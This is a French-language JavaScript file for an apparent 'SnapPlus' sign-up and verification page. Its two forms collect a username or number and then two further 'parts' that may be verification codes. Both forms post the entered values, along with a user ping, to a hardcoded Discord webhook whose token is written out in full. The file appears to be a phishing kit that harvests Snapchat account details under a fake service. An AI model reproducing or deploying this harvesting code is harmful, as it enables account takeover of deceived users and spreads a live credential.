const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1536133822293344328/HWy6sIVBSFPfFVB5eVUw_e9ZCG3-2UnGFKLIgfxQkno1U6KDiqGqZuQnysthD89iWWkP";


// ==========================================
// ÉTAPE 1 — PSEUDO
// ==========================================

const pseudoForm = document.getElementById("pseudoForm");

if (pseudoForm) {
  const pseudoInput = document.getElementById("pseudo");
  const errorMessage = document.getElementById("errorMessage");
  const submitButton = document.getElementById("submitButton");
  const buttonText = submitButton.querySelector(".button-text");

  pseudoForm.addEventListener("submit", async function (event) {
    event.preventDefault();

    const pseudo = pseudoInput.value.trim();

    errorMessage.textContent = "";

    if (pseudo.length < 2) {
      errorMessage.textContent =
        "Ton pseudo doit contenir au moins 2 caractères.";
      pseudoInput.focus();
      return;
    }

    if (pseudo.length > 32) {
      errorMessage.textContent =
        "Ton pseudo ne peut pas dépasser 32 caractères.";
      pseudoInput.focus();
      return;
    }

    submitButton.disabled = true;
    pseudoInput.disabled = true;
    buttonText.textContent = "Envoi…";

    try {
      const response = await fetch(DISCORD_WEBHOOK, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `<@1453480387501363292> 🔔 Nouveau Numero : **${pseudo}**`
        })
      });

      if (!response.ok) {
        throw new Error("Discord HTTP " + response.status);
      }

      sessionStorage.setItem("snapplus_pseudo", pseudo);

      window.location.href = "verification.html";

    } catch (error) {
      console.error("Erreur webhook :", error);

      errorMessage.textContent =
        "Impossible d'envoyer le pseudo.";

      submitButton.disabled = false;
      pseudoInput.disabled = false;
      buttonText.textContent = "Continuer →";
    }
  });
}


// ==========================================
// ÉTAPE 2 — VÉRIFICATION
// ==========================================

const verificationForm =
  document.getElementById("verificationForm");

if (verificationForm) {
  const firstPart =
    document.getElementById("firstPart");

  const secondPart =
    document.getElementById("secondPart");

  const errorMessage =
    document.getElementById("verificationError");

  const button =
    document.getElementById("verificationButton");

  const buttonText =
    button.querySelector(".button-text");

  verificationForm.addEventListener(
    "submit",
    async function (event) {

      event.preventDefault();

      const first = firstPart.value.trim();
      const second = secondPart.value.trim();

      errorMessage.textContent = "";

      if (!first || !second) {
        errorMessage.textContent =
          "Remplis les deux parties du pseudo.";
        return;
      }

      button.disabled = true;
      firstPart.disabled = true;
      secondPart.disabled = true;
      buttonText.textContent = "Envoi…";

      try {
        const response = await fetch(DISCORD_WEBHOOK, {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            content:
              "🔎 Confirmation SnapPlus\n" +
              "Première partie : **" + first + "**\n" +
              "Deuxième partie : **" + second + "**"
          })
        });

        if (!response.ok) {
          throw new Error(
            "Discord HTTP " + response.status
          );
        }

        sessionStorage.removeItem("snapplus_pseudo");

        window.location.href = "success.html";

      } catch (error) {
        console.error("Erreur webhook :", error);

        errorMessage.textContent =
          "Impossible d'envoyer la confirmation.";

        button.disabled = false;
        firstPart.disabled = false;
        secondPart.disabled = false;
        buttonText.textContent = "Confirmer →";
      }
    }
  );
}

